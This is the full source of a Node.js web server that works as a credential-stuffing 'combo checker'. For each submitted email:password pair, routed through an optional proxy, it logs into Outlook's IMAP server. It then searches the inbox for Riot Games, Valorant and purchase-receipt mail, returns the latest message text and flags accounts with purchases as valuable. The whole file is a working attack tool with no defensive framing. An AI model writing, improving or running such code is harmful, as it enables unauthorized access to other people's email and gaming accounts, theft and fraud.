const express = require('express');
const { ImapFlow } = require('imapflow');
const { simpleParser } = require('mailparser');
const { HttpsProxyAgent } = require('https-proxy-agent');
const app = express();

app.use(express.json({ limit: '100mb' }));
app.use(express.static('public'));

async function checkMail(email, password, proxyStr) {
    let agent = null;
    if (proxyStr && proxyStr.trim().length > 5) {
        try {
            const cleanProxy = proxyStr.trim();
            agent = new HttpsProxyAgent(cleanProxy);
        } catch (e) {
            console.log("Invalid Proxy Format:", proxyStr);
        }
    }

    const client = new ImapFlow({
        host: "outlook.office365.com",
        port: 993,
        secure: true,
        auth: { user: email, pass: password },
        logger: false,
        greetingTimeout: 20000,
        ...(agent && { tls: { agent } })
    });

    try {
        await client.connect();
        let lock = await client.getMailboxLock('INBOX');
        let result = { status: 'INVALID', count: 0, isSultan: false, body: "" };

        try {
            let messages = await client.search({
                or: [
                    { header: { field: 'from', value: 'Riot Games' } },
                    { body: 'Valorant' },
                    { body: 'Purchase Receipt' }
                ]
            });

            if (messages.length > 0) {
                result.status = 'HIT';
                result.count = messages.length;
                let lastMsg = await client.fetchOne(messages[messages.length - 1], { source: true });
                let parsed = await simpleParser(lastMsg.source);
                result.body = parsed.text || "No content";
                result.isSultan = /Purchase|Order|Receipt|Success|Payment/i.test(result.body);
            } else {
                result.status = 'NO_DATA';
            }
        } finally {
            lock.release();
        }
        await client.logout();
        return result;
    } catch (err) {
        const msg = err.message.toLowerCase();
        if (msg.includes('aup') || msg.includes('locked')) return { status: 'LOCKED' };
        return { status: 'INVALID' };
    }
}

app.post('/api/check', async (req, res) => {
    const { combo, proxy } = req.body;
    const parts = combo.split(':');
    const data = await checkMail(parts[0].trim(), parts[1].trim(), proxy);
    res.json({ ...data, combo });
});

app.listen(process.env.PORT || 7860);
